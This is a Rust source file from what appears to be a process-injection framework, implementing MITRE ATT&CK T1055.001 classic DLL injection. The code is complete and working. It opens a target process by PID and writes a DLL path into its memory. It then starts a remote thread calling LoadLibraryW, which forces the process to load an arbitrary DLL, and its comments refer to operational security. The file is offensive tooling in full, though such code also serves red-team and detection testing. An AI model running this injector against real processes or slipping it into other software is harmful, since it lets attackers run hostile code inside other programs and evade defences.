//! Implementation of **MITRE ATT&CK T1055.001: Dynamic-link Library Injection**.
//!
//! This module implements the "Classic" injection technique. It forces a remote process
//! to load a DLL from the disk by spawning a new thread that calls `LoadLibraryW`.

use std::{
    mem::transmute,
    os::windows::{ffi::OsStrExt, raw::HANDLE},
    path::Path,
    ptr::{null, null_mut},
};

use windows_sys::{
    Win32::{
        Foundation::{CloseHandle, FALSE, GetLastError, INVALID_HANDLE_VALUE},
        System::{
            Diagnostics::Debug::WriteProcessMemory,
            LibraryLoader::{GetModuleHandleW, GetProcAddress},
            Memory::{MEM_COMMIT, PAGE_READWRITE, VirtualAllocEx},
            Threading::{
                CreateRemoteThread, LPTHREAD_START_ROUTINE, OpenProcess, PROCESS_CREATE_THREAD,
                PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
            },
        },
    },
    core::PCSTR,
    w,
};

use crate::{
    Error, Result, info,
    payload::Payload,
    strategy::{DynamicLinkLibrary, Strategy, Technique},
    target::Target,
};

/// The concrete strategy implementation for T1055.001.
#[derive(Default)]
pub struct T1055_001;

impl Strategy for T1055_001 {
    fn execute(&self, technique: &Technique, payload: &Payload, target: &Target) -> Result<()> {
        let info = technique.info();
        info!("Strategy: {} ({})", info.mitre_id, info.name);

        // 1. Unwrap the configuration specific to this technique.
        let method = match technique {
            Technique::T1055_001(m) => m,
            _ => return Err(Error::Execution("Internal dispatch error".into())),
        };

        // 2. Validate Target: Must be a PID (Remote Injection).
        let process_id = match target {
            Target::Pid(id) => *id,
            _ => {
                return Err(Error::Validation(format!(
                    "Strategy '{}' requires a Target PID.",
                    info.mitre_id
                )));
            }
        };

        // 3. Validate Payload: Must be a DLL file path (on disk).
        // This technique cannot inject raw bytes; the OS loader needs a file path.
        let dll_path = match payload {
            Payload::DllFile {
                file_path: Some(p), ..
            } => p,
            Payload::DllFile {
                file_path: None, ..
            } => {
                return Err(Error::Validation(
                    "Classic DLL Injection requires the DLL to be on disk (path).".into(),
                ));
            }
            _ => {
                return Err(Error::Mismatch {
                    strategy: info.mitre_id,
                    variant: payload.variant_name(),
                });
            }
        };

        // 4. Execute the specific variant.
        match method {
            DynamicLinkLibrary::Classic => {
                info!("Method: Classic DLL Injection");
                inject_dll_classic(process_id, dll_path)
            }
        }
    }
}

/// A RAII (Resource Acquisition Is Initialization) wrapper for Windows Handles.
///
/// Ensures that `CloseHandle` is automatically called when the scope ends,
/// preventing resource leaks in the operating system.
struct HandleGuard(HANDLE);

impl HandleGuard {
    fn new(handle: HANDLE) -> Self {
        Self(handle)
    }
}

impl Drop for HandleGuard {
    fn drop(&mut self) {
        if !self.0.is_null() && self.0 != INVALID_HANDLE_VALUE {
            unsafe { CloseHandle(self.0) };
        }
    }
}

/// Performs the "Classic" DLL injection sequence.
///
/// # Logic Flow
/// 1. **OpenProcess**: Acquire a handle to the target PID with specific permissions.
/// 2. **VirtualAllocEx**: Allocate memory in the remote process for the DLL path.
/// 3. **WriteProcessMemory**: Copy the DLL path string into the allocated remote memory.
/// 4. **GetProcAddress**: Resolve the address of `LoadLibraryW` in `kernel32.dll`.
///    *Note: kernel32 is mapped at the same address in almost all processes.*
/// 5. **CreateRemoteThread**: Spawn a thread in the target that executes `LoadLibraryW(path)`.
fn inject_dll_classic(process_id: u32, dll_path: &Path) -> Result<()> {
    // 1. Prepare Path (Windows requires UTF-16 null-terminated strings)
    let path_utf16 = to_utf16_null_terminated(dll_path);
    let alloc_size = path_utf16.len() * size_of::<u16>();

    // 2. Open Target Process
    // Request minimal privileges required for the operation (OpSec best practice).
    let process_handle = unsafe {
        OpenProcess(
            PROCESS_CREATE_THREAD
                | PROCESS_QUERY_INFORMATION
                | PROCESS_VM_OPERATION
                | PROCESS_VM_READ
                | PROCESS_VM_WRITE,
            FALSE,
            process_id,
        )
    };

    if process_handle.is_null() {
        return Err(Error::Win32("OpenProcess", unsafe { GetLastError() }));
    }

    // Wrap in guard immediately to ensure cleanup on error.
    let process_guard = HandleGuard::new(process_handle);

    // 3. Allocate Memory in Target
    let remote_addr = unsafe {
        VirtualAllocEx(
            process_guard.0,
            null(),
            alloc_size,
            MEM_COMMIT,
            PAGE_READWRITE,
        )
    };

    if remote_addr.is_null() {
        return Err(Error::Win32("VirtualAllocEx", unsafe { GetLastError() }));
    }

    // 4. Write DLL Path to Target Memory
    let mut write_len: usize = 0;

    let success = unsafe {
        WriteProcessMemory(
            process_guard.0,
            remote_addr,
            path_utf16.as_ptr().cast(),
            alloc_size,
            &mut write_len,
        )
    };

    if success == 0 || write_len != alloc_size {
        return Err(Error::Win32("WriteProcessMemory", unsafe {
            GetLastError()
        }));
    }

    // 5. Resolve LoadLibraryW Address
    // We look it up in our own process. Because kernel32.dll is a "Known DLL",
    // ASLR usually maps it to the same address in all processes during the same boot session.
    let kernel32_ptr = w!("kernel32.dll");
    let module_handle = unsafe { GetModuleHandleW(kernel32_ptr) };

    if module_handle.is_null() {
        return Err(Error::Win32("GetModuleHandleW", unsafe { GetLastError() }));
    }

    let func_name = c"LoadLibraryW";

    let load_library_addr = unsafe { GetProcAddress(module_handle, func_name.as_ptr() as PCSTR) };

    if load_library_addr.is_none() {
        return Err(Error::Win32("GetProcAddress", unsafe { GetLastError() }));
    }

    let routine_ptr: LPTHREAD_START_ROUTINE = unsafe { transmute(load_library_addr) };

    // 6. Create Remote Thread
    // This executes LoadLibraryW(remote_addr) inside the target process.
    let thread_handle = unsafe {
        CreateRemoteThread(
            process_guard.0,
            null(),
            0,
            routine_ptr,
            remote_addr,
            0,
            null_mut(),
        )
    };

    if thread_handle.is_null() {
        return Err(Error::Win32("CreateRemoteThread", unsafe {
            GetLastError()
        }));
    }

    let _thread_guard = HandleGuard::new(thread_handle);

    Ok(())
}

/// Helper: Converts a Rust Path to a null-terminated UTF-16 vector.
fn to_utf16_null_terminated(path: &Path) -> Vec<u16> {
    path.as_os_str().encode_wide().chain([0]).collect()
}
